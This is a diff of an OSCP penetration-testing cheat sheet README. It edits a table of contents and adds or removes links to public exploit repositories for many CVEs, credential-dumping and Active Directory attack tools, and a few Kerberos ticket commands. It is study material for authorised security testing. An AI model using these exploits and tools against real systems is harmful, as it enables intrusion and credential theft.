@@ -1,5 +1,5 @@
 <p align="center">
-  <img width="300" height="300" src="https://github.com/0xsyr0/OSCP/blob/main/images/kali-linux.svg">
+  <img width="300" height="300" src="/images/kali-linux.svg">
 </p>
 
 # OSCP Cheat Sheet
@@ -18,9 +18,7 @@ Every help or hint is appreciated!
 
 **DISCLAIMER**: A guy on Twitter got a point. Automatic exploitation tools like `sqlmap` are prohibited to use in the exam. The same goes for the automatic exploitation functionality of `LinPEAS`. I am not keeping track of current guidelines related to those tools. For that I want to point out that I am not responsible if anybody uses a tool without double checking the latest exam restrictions and fails the exam. Inform yourself before taking the exam!
 
-I removed `sqlmap` because of the reasons above but `Metasploit` is still part of the guide because you can use it for one specific module. Thank you **Muztahidul Tanim** for making me aware and to [Yeeb](https://github.com/Yeeb1) for the resources.
-
-Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#exam-restrictions) and the discussion about [LinPEAS](https://www.offensive-security.com/offsec/understanding-pentest-tools-scripts/?hss_channel=tw-134994790). I hope this helps.
+Here are the link to the [OSCP Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#exam-restrictions) and the discussion about [LinPEAS](https://www.offensive-security.com/offsec/understanding-pentest-tools-scripts/?hss_channel=tw-134994790). I hope this helps.
 
 ---
 
@@ -34,150 +32,153 @@ Thank you for reading.
 
 ## Table of Contents
 
-- [Basics](https://github.com/0xsyr0/OSCP#basics)
-- [Information Gathering](https://github.com/0xsyr0/OSCP#information-gathering)
-- [Vulnerability Analysis](https://github.com/0xsyr0/OSCP#vulnerability-analysis)
-- [Web Application Analysis](https://github.com/0xsyr0/OSCP#web-application-analysis)
-- [Database Assessment](https://github.com/0xsyr0/OSCP#database-assessment)
-- [Password Attacks](https://github.com/0xsyr0/OSCP#password-attacks)
-- [Exploitation Tools](https://github.com/0xsyr0/OSCP#exploitation-tools)
-- [Post Exploitation](https://github.com/0xsyr0/OSCP#post-exploitation)
-- [Exploit Databases](https://github.com/0xsyr0/OSCP#exploit-databases)
-- [CVEs](https://github.com/0xsyr0/OSCP#cves)
-- [Payloads](https://github.com/0xsyr0/OSCP#payloads)
-- [Wordlists](https://github.com/0xsyr0/OSCP#wordlists)
-- [Social Media Resources](https://github.com/0xsyr0/OSCP#social-media-resources)
-- [Commands](https://github.com/0xsyr0/OSCP#commands)
-	- [Basics](https://github.com/0xsyr0/OSCP#basics-1)
-		- [curl](https://github.com/0xsyr0/OSCP#curl)
-		- [Chisel](https://github.com/0xsyr0/OSCP#chisel)
-		- [File Transfer](https://github.com/0xsyr0/OSCP#file-transfer)
-  		- [FTP](https://github.com/0xsyr0/OSCP#ftp)
-		- [Kerberos](https://github.com/0xsyr0/OSCP#kerberos)
-		- [Ligolo-ng](https://github.com/0xsyr0/OSCP#ligolo-ng)
-		- [Linux](https://github.com/0xsyr0/OSCP#linux)
-		- [Microsoft Windows](https://github.com/0xsyr0/OSCP#microsoft-windows)
-		- [PHP Webserver](https://github.com/0xsyr0/OSCP#php-webserver)
-		- [Ping](https://github.com/0xsyr0/OSCP#ping)
-		- [Python Webserver](https://github.com/0xsyr0/OSCP#python-webserver)
-		- [RDP](https://github.com/0xsyr0/OSCP#rdp)
-		- [showmount](https://github.com/0xsyr0/OSCP#showmount)
-		- [smbclient](https://github.com/0xsyr0/OSCP#smbclient)
-		- [socat](https://github.com/0xsyr0/OSCP#socat)
-		- [SSH](https://github.com/0xsyr0/OSCP#ssh)
-		- [Time and Date](https://github.com/0xsyr0/OSCP#time-and-date)
-		- [Tmux](https://github.com/0xsyr0/OSCP#tmux)
-		- [Upgrading Shells](https://github.com/0xsyr0/OSCP#upgrading-shells)
-		- [VirtualBox](https://github.com/0xsyr0/OSCP#virtualbox)
-		- [virtualenv](https://github.com/0xsyr0/OSCP#virtualenv)
-	- [Information Gathering](https://github.com/0xsyr0/OSCP#information-gathering-1)
-		- [memcached](https://github.com/0xsyr0/OSCP#memcached)
-		- [NetBIOS](https://github.com/0xsyr0/OSCP#netbios)
-		- [Nmap](https://github.com/0xsyr0/OSCP#nmap)
-		- [Port Scanning](https://github.com/0xsyr0/OSCP#port-scanning)
-		- [snmpwalk](https://github.com/0xsyr0/OSCP#snmpwalk)
-	- [Web Application Analysis](https://github.com/0xsyr0/OSCP#web-application-analysis-1)
-		- [Burp Suite](https://github.com/0xsyr0/OSCP#burp-suite)
-  		- [cadaver](https://github.com/0xsyr0/OSCP#cadaver)
-		- [Cross-Site Scripting (XSS)](https://github.com/0xsyr0/OSCP#cross-site-scripting-xss)
-		- [ffuf](https://github.com/0xsyr0/OSCP#ffuf)
-		- [Gobuster](https://github.com/0xsyr0/OSCP#gobuster)
-		- [GitTools](https://github.com/0xsyr0/OSCP#gittools)
-		- [Local File Inclusion (LFI)](https://github.com/0xsyr0/OSCP#local-file-inclusion-lfi)
-		- [PDF PHP Inclusion](https://github.com/0xsyr0/OSCP#pdf-php-inclusion)
-		- [PHP Upload Filter Bypasses](https://github.com/0xsyr0/OSCP#php-upload-filter-bypasses)
-		- [PHP Filter Chain Generator](https://github.com/0xsyr0/OSCP#php-filter-chain-generator)
-		- [PHP Generic Gadget Chains (PHPGGC)](https://github.com/0xsyr0/OSCP#php-generic-gadget-chains-phpggc)
-		- [Server-Side Request Forgery (SSRF)](https://github.com/0xsyr0/OSCP#server-side-request-forgery-ssrf)
-		- [Server-Side Template Injection (SSTI)](https://github.com/0xsyr0/OSCP#server-side-template-injection-ssti)
-		- [Upload Vulnerabilities](https://github.com/0xsyr0/OSCP#upload-vulnerabilities)
-		- [wfuzz](https://github.com/0xsyr0/OSCP#wfuzz)
-		- [WPScan](https://github.com/0xsyr0/OSCP#wpscan)
-		- [XML External Entity (XXE)](https://github.com/0xsyr0/OSCP#xml-external-entity-xxe)
-	- [Database Analysis](https://github.com/0xsyr0/OSCP#database-analysis)
- 		- [impacket-mssqlclient](https://github.com/0xsyr0/OSCP#impacket-mssqlclient)
-		- [MongoDB](https://github.com/0xsyr0/OSCP#mongodb)
-		- [MSSQL](https://github.com/0xsyr0/OSCP#mssql)
-		- [MySQL](https://github.com/0xsyr0/OSCP#mysql)
-		- [NoSQL Injection](https://github.com/0xsyr0/OSCP#nosql-injection)
-		- [PostgreSQL](https://github.com/0xsyr0/OSCP#postgresql)
-		- [Redis](https://github.com/0xsyr0/OSCP#redis)
-		- [SQL Injection](https://github.com/0xsyr0/OSCP#sql-injection)
-		- [SQL Truncation Attack](https://github.com/0xsyr0/OSCP#sql-truncation-attack)
-		- [sqlite3](https://github.com/0xsyr0/OSCP#sqlite3)
-		- [sqsh](https://github.com/0xsyr0/OSCP#sqsh)
-	- [Password Attacks](https://github.com/0xsyr0/OSCP#password-attacks-1)
-		- [CrackMapExec](https://github.com/0xsyr0/OSCP#crackmapexec)
-		- [fcrack](https://github.com/0xsyr0/OSCP#fcrack)
-		- [hashcat](https://github.com/0xsyr0/OSCP#hashcat)
-		- [Hydra](https://github.com/0xsyr0/OSCP#hydra)
-		- [John](https://github.com/0xsyr0/OSCP#john)
-		- [Kerbrute](https://github.com/0xsyr0/OSCP#kerbrute)
-		- [LaZagne](https://github.com/0xsyr0/OSCP#lazagne)
-		- [mimikatz](https://github.com/0xsyr0/OSCP#mimikatz)
-  		- [NetExec](https://github.com/0xsyr0/OSCP#NetExec)
-		- [pypykatz](https://github.com/0xsyr0/OSCP#pypykatz)
-	- [Exploitation Tools](https://github.com/0xsyr0/OSCP#exploitation-tools-1)
-		- [Metasploit](https://github.com/0xsyr0/OSCP#metasploit)
-	- [Post Exploitation](https://github.com/0xsyr0/OSCP#post-exploitation-1)
- 		- [Active Directory Certificate Services (AD CS)](https://github.com/0xsyr0/OSCP#active-directory-certificate-services-ad-cs)
-		- [ADCSTemplate](https://github.com/0xsyr0/OSCP#adcstemplate)
-		- [BloodHound](https://github.com/0xsyr0/OSCP#bloodhound)
-		- [BloodHound Python](https://github.com/0xsyr0/OSCP#bloodhound-python)
-  		- [bloodyAD](https://github.com/0xsyr0/OSCP#bloodyAD)
-		- [Certify](https://github.com/0xsyr0/OSCP#certify)
-		- [Certipy](https://github.com/0xsyr0/OSCP#certipy)
-		- [enum4linux-ng](https://github.com/0xsyr0/OSCP#enum4linux-ng)
-		- [Evil-WinRM](https://github.com/0xsyr0/OSCP#evil-winrm)
-		- [Impacket](https://github.com/0xsyr0/OSCP#impacket-1)
-		- [JAWS](https://github.com/0xsyr0/OSCP#jaws)
-		- [Kerberos](https://github.com/0xsyr0/OSCP#kerberos-1)
-		- [ldapsearch](https://github.com/0xsyr0/OSCP#ldapsearch)
-		- [Linux](https://github.com/0xsyr0/OSCP#linux-1)
-		- [Microsoft Windows](https://github.com/0xsyr0/OSCP#microsoft-windows-1)
-		- [PassTheCert](https://github.com/0xsyr0/OSCP#passthecert)
-		- [PKINITtools](https://github.com/0xsyr0/OSCP#pkinittools)
-		- [Port Scanning](https://github.com/0xsyr0/OSCP#port-scanning)
-		- [powercat](https://github.com/0xsyr0/OSCP#powercat)
-		- [Powermad](https://github.com/0xsyr0/OSCP#powermad)
-		- [PowerShell](https://github.com/0xsyr0/OSCP#powershell)
-		- [pwncat](https://github.com/0xsyr0/OSCP#pwncat)
-		- [rpcclient](https://github.com/0xsyr0/OSCP#rpcclient)
-		- [Rubeus](https://github.com/0xsyr0/OSCP#rubeus)
-		- [RunasCs](https://github.com/0xsyr0/OSCP#runascs)
-		- [smbpasswd](https://github.com/0xsyr0/OSCP#smbpasswd)
-		- [winexe](https://github.com/0xsyr0/OSCP#winexe)
-	- [CVE](https://github.com/0xsyr0/OSCP#cve)
-		- [CVE-2014-6271: Shellshock RCE PoC](https://github.com/0xsyr0/OSCP#cve-2014-6271-shellshock-rce-poc)
-		- [CVE-2016-1531: exim LPE](https://github.com/0xsyr0/OSCP#cve-2016-1531-exim-lpe)
-		- [CVE-2019-14287: Sudo Bypass](https://github.com/0xsyr0/OSCP#cve-2019-14287-sudo-bypass)
-		- [CVE-2020-1472: ZeroLogon PE](https://github.com/0xsyr0/OSCP#cve-2020-1472-zerologon-pe)
-		- [CVE-2021–3156: Sudo / sudoedit LPE](https://github.com/0xsyr0/OSCP#cve-2021-3156-sudo--sudoedit-lpe)
-		- [CVE-2021-44228: Log4Shell RCE (0-day)](https://github.com/0xsyr0/OSCP#cve-2021-44228-log4shell-rce-0-day)
-		- [CVE-2022-0847: Dirty Pipe LPE](https://github.com/0xsyr0/OSCP#cve-2022-0847-dirty-pipe-lpe)
-		- [CVE-2022-22963: Spring4Shell RCE (0-day)](https://github.com/0xsyr0/OSCP#cve-2022-22963-spring4shell-rce-0-day)
-		- [CVE-2022-30190: MS-MSDT Follina RCE](https://github.com/0xsyr0/OSCP#cve-2022-30190-ms-msdt-follina-rce)
-		- [CVE-2022-31214: Firejail LPE](https://github.com/0xsyr0/OSCP#cve-2022-31214-firejail-lpe)
-		- [CVE-2023-21746: Windows NTLM EoP LocalPotato LPE](https://github.com/0xsyr0/OSCP#cve-2023-21746-windows-ntlm-eop-localpotato-lpe)
-		- [CVE-2023-22809: Sudo Bypass](https://github.com/0xsyr0/OSCP#cve-2023-22809-sudo-bypass)
-		- [CVE-2023-23397: Microsoft Outlook (Click-to-Run) PE (0-day) (PowerShell Implementation)](https://github.com/0xsyr0/OSCP#cve-2023-23397-microsoft-outlook-click-to-run-pe-0-day-powershell-implementation)
-		- [CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)](https://github.com/0xsyr0/OSCP#cve-2023-32629-cve-2023-2640-gameoverlay-ubuntu-kernel-exploit-lpe-0-day)
-  		- [CVE-2023-4911: Looney Tunables LPE](https://github.com/0xsyr0/OSCP#cve-2023-4911-looney-tunables-lpe)
-   		- [CVE-2023-7028: GitLab Account Takeover](https://github.com/0xsyr0/OSCP#cve-2023-7028-gitlab-account-takeover)
-  		- [GodPotato LPE](https://github.com/0xsyr0/OSCP#godpotato-lpe)
-		- [Juicy Potato LPE](https://github.com/0xsyr0/OSCP#juicy-potato-lpe)
-  		- [JuicyPotatoNG LPE](https://github.com/0xsyr0/OSCP#juicypotatong-lpe)
-		- [MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE](https://github.com/0xsyr0/OSCP#mysql-4x50-user-defined-function-udf-dynamic-library-2-lpe)
-  		- [PrintSpoofer LPE](https://github.com/0xsyr0/OSCP#printspoofer-lpe)
-		- [SharpEfsPotato LPE](https://github.com/0xsyr0/OSCP#sharpefspotato-lpe)
-		- [Shocker Container Escape](https://github.com/0xsyr0/OSCP#shocker-container-escape)
-	- [Payloads](https://github.com/0xsyr0/OSCP#payloads-1)
-		- [Exiftool](https://github.com/0xsyr0/OSCP#exiftool)
-		- [Reverse Shells](https://github.com/0xsyr0/OSCP#reverse-shells)
-		- [Web Shells](https://github.com/0xsyr0/OSCP#web-shells)
-	- [Templates](https://github.com/0xsyr0/OSCP#templates)
-		- [ASPX Web Shell](https://github.com/0xsyr0/OSCP#aspx-web-shell)
-		- [Bad YAML](https://github.com/0xsyr0/OSCP#bad-yaml)
+- [Basics](#basics)
+- [Information Gathering](#information-gathering)
+- [Vulnerability Analysis](#vulnerability-analysis)
+- [Web Application Analysis](#web-application-analysis)
+- [Database Assessment](#database-assessment)
+- [Password Attacks](#password-attacks)
+- [Exploitation Tools](#exploitation-tools)
+- [Post Exploitation](#post-exploitation)
+- [Exploit Databases](#exploit-databases)
+- [CVEs](#cves)
+- [Payloads](#payloads)
+- [Wordlists](#wordlists)
+- [Social Media Resources](#social-media-resources)
+- [Commands](#commands)
+	- [Basics](#basics-1)
+		- [curl](#curl)
+		- [Chisel](#chisel)
+		- [File Transfer](#file-transfer)
+  		- [FTP](#ftp)
+		- [Kerberos](#kerberos)
+		- [Ligolo-ng](#ligolo-ng)
+		- [Linux](#linux)
+		- [Microsoft Windows](#microsoft-windows)
+		- [PHP Webserver](#php-webserver)
+		- [Ping](#ping)
+		- [Python Webserver](#python-webserver)
+		- [RDP](#rdp)
+		- [showmount](#showmount)
+  		- [SMB](#smb)
+		- [smbclient](#smbclient)
+		- [socat](#socat)
+		- [SSH](#ssh)
+		- [Time and Date](#time-and-date)
+		- [Tmux](#tmux)
+		- [Upgrading Shells](#upgrading-shells)
+		- [VirtualBox](#virtualbox)
+		- [virtualenv](#virtualenv)
+	- [Information Gathering](#information-gathering-1)
+		- [memcached](#memcached)
+		- [NetBIOS](#netbios)
+		- [Nmap](#nmap)
+		- [Port Scanning](#port-scanning)
+		- [snmpwalk](#snmpwalk)
+	- [Web Application Analysis](#web-application-analysis-1)
+		- [Burp Suite](#burp-suite)
+  		- [cadaver](#cadaver)
+		- [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
+		- [ffuf](#ffuf)
+		- [Gobuster](#gobuster)
+		- [GitTools](#gittools)
+		- [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
+		- [PDF PHP Inclusion](#pdf-php-inclusion)
+		- [PHP Upload Filter Bypasses](#php-upload-filter-bypasses)
+		- [PHP Filter Chain Generator](#php-filter-chain-generator)
+		- [PHP Generic Gadget Chains (PHPGGC)](#php-generic-gadget-chains-phpggc)
+		- [Server-Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)
+		- [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
+		- [Upload Vulnerabilities](#upload-vulnerabilities)
+		- [wfuzz](#wfuzz)
+		- [WPScan](#wpscan)
+		- [XML External Entity (XXE)](#xml-external-entity-xxe)
+	- [Database Analysis](#database-analysis)
+ 		- [impacket-mssqlclient](#impacket-mssqlclient)
+		- [MongoDB](#mongodb)
+		- [MSSQL](#mssql)
+		- [MySQL](#mysql)
+		- [NoSQL Injection](#nosql-injection)
+		- [PostgreSQL](#postgresql)
+		- [Redis](#redis)
+		- [SQL Injection](#sql-injection)
+		- [SQL Truncation Attack](#sql-truncation-attack)
+		- [sqlite3](#sqlite3)
+		- [sqsh](#sqsh)
+	- [Password Attacks](#password-attacks-1)
+		- [CrackMapExec](#crackmapexec)
+		- [fcrack](#fcrack)
+  		- [Group Policy Preferences (GPP)](#group-policy-preferences-gpp)
+		- [hashcat](#hashcat)
+		- [Hydra](#hydra)
+		- [John](#john)
+		- [Kerbrute](#kerbrute)
+		- [LaZagne](#lazagne)
+		- [mimikatz](#mimikatz)
+  		- [NetExec](#NetExec)
+		- [pypykatz](#pypykatz)
+	- [Exploitation Tools](#exploitation-tools-1)
+		- [Metasploit](#metasploit)
+	- [Post Exploitation](#post-exploitation-1)
+ 		- [Abusing Account Operators Group Membership](#abusing-account-operators-group-membership)
+ 		- [Active Directory Certificate Services (AD CS)](#active-directory-certificate-services-ad-cs)
+		- [ADCSTemplate](#adcstemplate)
+  		- [ADMiner](#adminer)
+		- [BloodHound](#bloodhound)
+		- [BloodHound Python](#bloodhound-python)
+  		- [bloodyAD](#bloodyAD)
+		- [Certify](#certify)
+		- [Certipy](#certipy)
+		- [enum4linux-ng](#enum4linux-ng)
+		- [Evil-WinRM](#evil-winrm)
+		- [Impacket](#impacket-1)
+		- [JAWS](#jaws)
+		- [Kerberos](#kerberos-1)
+		- [ldapsearch](#ldapsearch)
+		- [Linux](#linux-1)
+		- [Microsoft Windows](#microsoft-windows-1)
+		- [PassTheCert](#passthecert)
+		- [PKINITtools](#pkinittools)
+		- [Port Scanning](#port-scanning)
+		- [powercat](#powercat)
+		- [Powermad](#powermad)
+		- [PowerShell](#powershell)
+  		- [PrivescCheck](#privesccheck)
+		- [pwncat](#pwncat)
+		- [rpcclient](#rpcclient)
+		- [Rubeus](#rubeus)
+		- [RunasCs](#runascs)
+		- [smbpasswd](#smbpasswd)
+		- [winexe](#winexe)
+	- [CVE](#cve)
+		- [CVE-2014-6271: Shellshock RCE PoC](#cve-2014-6271-shellshock-rce-poc)
+		- [CVE-2016-1531: exim LPE](#cve-2016-1531-exim-lpe)
+		- [CVE-2019-14287: Sudo Bypass](#cve-2019-14287-sudo-bypass)
+		- [CVE-2020-1472: ZeroLogon PE](#cve-2020-1472-zerologon-pe)
+		- [CVE-2021–3156: Sudo / sudoedit LPE](#cve-2021-3156-sudo--sudoedit-lpe)
+		- [CVE-2021-44228: Log4Shell RCE (0-day)](#cve-2021-44228-log4shell-rce-0-day)
+		- [CVE-2022-0847: Dirty Pipe LPE](#cve-2022-0847-dirty-pipe-lpe)
+		- [CVE-2022-22963: Spring4Shell RCE (0-day)](#cve-2022-22963-spring4shell-rce-0-day)
+		- [CVE-2022-31214: Firejail LPE](#cve-2022-31214-firejail-lpe)
+		- [CVE-2023-21746: Windows NTLM EoP LocalPotato LPE](#cve-2023-21746-windows-ntlm-eop-localpotato-lpe)
+		- [CVE-2023-22809: Sudo Bypass](#cve-2023-22809-sudo-bypass)
+		- [CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)](#cve-2023-32629-cve-2023-2640-gameoverlay-ubuntu-kernel-exploit-lpe-0-day)
+  		- [CVE-2023-4911: Looney Tunables LPE](#cve-2023-4911-looney-tunables-lpe)
+   		- [CVE-2023-7028: GitLab Account Takeover](#cve-2023-7028-gitlab-account-takeover)
+  		- [GodPotato LPE](#godpotato-lpe)
+		- [Juicy Potato LPE](#juicy-potato-lpe)
+  		- [JuicyPotatoNG LPE](#juicypotatong-lpe)
+		- [MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE](#mysql-4x50-user-defined-function-udf-dynamic-library-2-lpe)
+  		- [PrintSpoofer LPE](#printspoofer-lpe)
+		- [SharpEfsPotato LPE](#sharpefspotato-lpe)
+		- [Shocker Container Escape](#shocker-container-escape)
+	- [Payloads](#payloads-1)
+		- [Exiftool](#exiftool)
+		- [Reverse Shells](#reverse-shells)
+		- [Web Shells](#web-shells)
+	- [Templates](#templates)
+		- [ASPX Web Shell](#aspx-web-shell)
+		- [Bad YAML](#bad-yaml)
 
 ### Basics
 
@@ -243,10 +244,8 @@ Thank you for reading.
 | LaZagne | https://github.com/AlessandroZ/LaZagne |
 | mimikatz | https://github.com/gentilkiwi/mimikatz |
 | NetExec | https://github.com/Pennyw0rth/NetExec |
-| Patator | https://github.com/lanjelot/patator |
+| ntlm.pw | https://ntlm.pw |
 | pypykatz | https://github.com/skelsec/pypykatz |
-| RsaCtfTool | https://github.com/Ganapati/RsaCtfTool |
-| SprayingToolkit | https://github.com/byt3bl33d3r/SprayingToolkit |
 
 ### Exploitation Tools
 
@@ -261,6 +260,7 @@ Thank you for reading.
 | --- | --- |
 | ADCSKiller - An ADCS Exploitation Automation Tool | https://github.com/grimlockx/ADCSKiller |
 | ADCSTemplate | https://github.com/GoateePFE/ADCSTemplate |
+| ADMiner | https://github.com/Mazars-Tech/AD_Miner |
 | BloodHound Docker | https://github.com/belane/docker-bloodhound |
 | BloodHound | https://github.com/BloodHoundAD/BloodHound |
 | BloodHound | https://github.com/ly4k/BloodHound |
@@ -279,7 +279,6 @@ Thank you for reading.
 | LAPSDumper | https://github.com/n00py/LAPSDumper |
 | LES | https://github.com/The-Z-Labs/linux-exploit-suggester |
 | LinEnum | https://github.com/rebootuser/LinEnum |
-| LOLBAS | https://lolbas-project.github.io |
 | lsassy | https://github.com/Hackndo/lsassy |
 | nanodump | https://github.com/helpsystems/nanodump |
 | PassTheCert | https://github.com/AlmondOffSec/PassTheCert |
@@ -292,6 +291,7 @@ Thank you for reading.
 | PowerView.py | https://github.com/aniqfakhrul/powerview.py |
 | PPLdump | https://github.com/itm4n/PPLdump |
 | Priv2Admin | https://github.com/gtworek/Priv2Admin |
+| PrivescCheck | https://github.com/itm4n/PrivescCheck |
 | PSPKIAudit | https://github.com/GhostPack/PSPKIAudit |
 | pspy | https://github.com/DominicBreuker/pspy |
 | pth-toolkit | https://github.com/byt3bl33d3r/pth-toolkit |
@@ -301,7 +301,9 @@ Thank you for reading.
 | RunasCs | https://github.com/antonioCoco/RunasCs |
 | RustHound | https://github.com/OPENCYBER-FR/RustHound |
 | scavenger | https://github.com/SpiderLabs/scavenger |
+| SharpADWS | https://github.com/wh0amitz/SharpADWS |
 | SharpCollection | https://github.com/Flangvik/SharpCollection |
+| SharpChromium | https://github.com/djhohnstein/SharpChromium |
 | SharpHound | https://github.com/BloodHoundAD/SharpHound |
 | SharpView | https://github.com/tevora-threat/SharpView |
 | Sherlock | https://github.com/rasta-mouse/Sherlock |
@@ -369,9 +371,6 @@ Thank you for reading.
 | CVE-2021-4034 | PwnKit Pkexec LPE PoC (1) | https://github.com/dzonerzy/poc-cve-2021-4034 |
 | CVE-2021-4034 | PwnKit Pkexec LPE PoC (2) | https://github.com/arthepsy/CVE-2021-4034 |
 | CVE-2021-4034 | PwnKit Pkexec LPE PoC (3) | https://github.com/nikaiw/CVE-2021-4034 |
-| CVE-2021-40444 | MSHTML builders RCE | https://github.com/aslitsecurity/CVE-2021-40444_builders |
-| CVE-2021-40444 | MSHTML Exploit RCE | https://xret2pwn.github.io/CVE-2021-40444-Analysis-and-Exploit/ |
-| CVE-2021-40444 | MSHTML RCE PoC | https://github.com/lockedbyte/CVE-2021-40444 |
 | CVE-2021-41379 | InstallerFileTakeOver LPE (0-day) (Archive) | https://github.com/klinix5/InstallerFileTakeOver |
 | CVE-2021-41379 | InstallerFileTakeOver LPE (0-day) (Fork) | https://github.com/waltlin/CVE-2021-41379-With-Public-Exploit-Lets-You-Become-An-Admin-InstallerFileTakeOver |
 | CVE-2021-41773,CVE-2021-42013, CVE-2020-17519 | Simples Apache Path Traversal (0-day) | https://github.com/MrCl0wnLab/SimplesApachePathTraversal |
@@ -381,27 +380,22 @@ Thank you for reading.
 | CVE-2021-42287,CVE-2021-42278 | noPac LPE (2) | https://github.com/Ridter/noPac |
 | CVE-2021-42321 | Microsoft Exchange Server RCE | https://gist.github.com/testanull/0188c1ae847f37a70fe536123d14f398 |
 | CVE-2021-44228 | Log4Shell RCE (0-day) | https://github.com/kozmer/log4j-shell-poc |
+| CVE-2021-44228 | Log4Shell RCE (0-day) | https://github.com/welk1n/JNDI-Injection-Exploit |
 | CVE-2022-0847 | DirtyPipe-Exploits LPE | https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits |
 | CVE-2022-21999 | SpoolFool, Windows Print Spooler LPE | https://github.com/ly4k/SpoolFool |
 | CVE-2022-22963 | Spring4Shell RCE (0-day) | https://github.com/tweedge/springcore-0day-en |
 | CVE-2022-23119,CVE-2022-23120 | Trend Micro Deep Security Agent for Linux Arbitrary File Read | https://github.com/modzero/MZ-21-02-Trendmicro |
 | CVE-2022-24715 | Icinga Web 2 Authenticated Remote Code Execution RCE | https://github.com/JacobEbben/CVE-2022-24715 |
 | CVE-2022-26134 | ConfluentPwn RCE (0-day) | https://github.com/redhuntlabs/ConfluentPwn |
-| CVE-2022-30190 | MS-MSDT Follina Attack Vector RCE | https://github.com/JohnHammond/msdt-follina |
-| CVE-2022-30190 | MS-MSDT Follina RCE PoC | https://github.com/onecloudemoji/CVE-2022-30190 |
-| CVE-2022-30190 | MS-MSDT Follina RCE (Python Implementation) | https://github.com/chvancooten/follina.py |
 | CVE-2022-31214 | Firejail / Firejoin LPE | https://seclists.org/oss-sec/2022/q2/188 |
 | CVE-2022-31214 | Firejail / Firejoin LPE | https://www.openwall.com/lists/oss-security/2022/06/08/10 |
 | CVE-2022-34918 | Netfilter Kernel Exploit LPE | https://github.com/randorisec/CVE-2022-34918-LPE-PoC |
 | CVE-2022-46169 | Cacti Authentication Bypass RCE | https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit |
-| CVE-2023-21716 | CVE-2023-21716: Microsoft Word RTF Font Table Heap Corruption RCE PoC (Python Implementation) | https://github.com/Xnuvers007/CVE-2023-21716 |
 | CVE-2023-21746 | Windows NTLM EoP LocalPotato LPE | https://github.com/decoder-it/LocalPotato |
 | CVE-2023-21768 | Windows Ancillary Function Driver for WinSock LPE POC | https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768 |
 | CVE-2023-21817 | Kerberos Unlock LPE PoC | https://gist.github.com/monoxgas/f615514fb51ebb55a7229f3cf79cf95b |
 | CVE-2023-22809 | sudoedit LPE | https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc |
-| CVE-2023-23397 | Microsoft Outlook (Click-to-Run) PE (0-day) | https://github.com/sqrtZeroKnowledge/CVE-2023-23397_EXPLOIT_0DAY |
-| CVE-2023-23397 | Microsoft Outlook (Click-to-Run) PE (0-day) (PowerShell Implementation) | https://github.com/api0cradle/CVE-2023-23397-POC-Powershell |
-| CVE-2023-23397 | Microsoft Outlook (Click-to-Run) PE (0-day) (Python Implementation) | https://github.com/Trackflaw/CVE-2023-23397 |
+| CVE-2023-23752 | Joomla Unauthenticated Information Disclosure | https://github.com/Acceis/exploit-CVE-2023-23752 |
 | CVE-2023-25690 | Apache mod_proxy HTTP Request Smuggling PoC | https://github.com/dhmosfunk/CVE-2023-25690-POC |
 | CVE-2023-28879 | Shell in the Ghost: Ghostscript RCE PoC | https://github.com/AlmondOffSec/PoCs/tree/master/Ghostscript_rce |
 | CVE-2023-32233 | Use-After-Free in Netfilter nf_tables LPE | https://github.com/Liuk3r/CVE-2023-32233 |
@@ -410,9 +404,13 @@ Thank you for reading.
 | CVE-2023-51467, CVE-2023-49070 | Apache OFBiz Authentication Bypass | https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass |
 | CVE-2023-7028 | GitLab Account Takeover | https://github.com/V1lu0/CVE-2023-7028 |
 | CVE-2023-7028 | GitLab Account Takeover | https://github.com/Vozec/CVE-2023-7028 |
+| CVE-2024-0582 | Ubuntu Linux Kernel io_uring LPE | https://github.com/ysanatomic/io_uring_LPE-CVE-2024-0582 |
+| CVE-2024-1086 | Use-After-Free Linux Kernel Netfilter nf_tables LPE | https://github.com/Notselwyn/CVE-2024-1086 |
 | n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
 | n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
 | n/a | StorSvc LPE | https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc |
+| n/a | ADCSCoercePotato | https://github.com/decoder-it/ADCSCoercePotato |
+| n/a | CoercedPotato LPE | https://github.com/Prepouce/CoercedPotato |
 | n/a | DCOMPotato LPE | https://github.com/zcgonvh/DCOMPotato |
 | n/a | GenericPotato LPE | https://github.com/micahvandeusen/GenericPotato |
 | n/a | GodPotato LPE | https://github.com/BeichenDream/GodPotato |
@@ -445,7 +443,6 @@ Thank you for reading.
 | PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
 | phpgcc | https://github.com/ambionics/phpggc |
 | PHP-Reverse-Shell | https://github.com/ivan-sincek/php-reverse-shell|
-| PowerLine | https://github.com/fullmetalcache/powerline |
 | webshell | https://github.com/tennc/webshell |
 | Web-Shells | https://github.com/TheBinitGhimire/Web-Shells |
 
@@ -459,6 +456,7 @@ Thank you for reading.
 | CUPP | https://github.com/Mebus/cupp |
 | Kerberos Username Enumeration | https://github.com/attackdebris/kerberos_enum_userlists |
 | SecLists | https://github.com/danielmiessler/SecLists |
+| Username Anarchy | https://github.com/urbanadventurer/username-anarchy |
 
 ### Social Media Resources
 
@@ -627,11 +625,15 @@ wget -r ftp://anonymous:anonymous@<RHOST>
 sudo apt-get install krb5-kdc
 ```
 
+##### Ticket Handling
+
 ```c
 impacket-getTGT <DOMAIN>/<USERNAME>:'<PASSWORD>'
 export KRB5CCNAME=<FILE>.ccache
 export KRB5CCNAME='realpath <FILE>.ccache'
 ```
+
+##### Kerberos related Files
 
 ```c
 /etc/krb5.conf                   // kerberos configuration file location
